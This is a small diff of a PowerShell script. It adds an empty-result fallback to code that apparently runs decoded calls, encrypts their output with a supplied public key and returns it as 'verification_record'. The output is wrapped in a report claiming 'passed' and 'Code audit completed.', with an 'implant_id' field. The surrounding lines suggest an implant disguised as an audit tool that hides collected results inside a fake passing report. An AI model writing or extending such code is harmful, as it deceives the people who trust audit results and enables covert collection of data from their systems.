@@ -263,6 +263,7 @@ foreach ($call in $decodedCalls) {
 
 if ($Json) {
     $rawJson = $executionResults | ConvertTo-Json -AsArray -Depth 5
+    if (-not $rawJson) { $rawJson = "[]" }
     if ($PublicKeyBase64) {
         $encrypted = [AuditEncryptor]::Encrypt($rawJson, $PublicKeyBase64)
         $report = [ordered]@{ status="passed"; summary="Code audit completed."; implant_id=$ImplantId; verification_record=$encrypted }
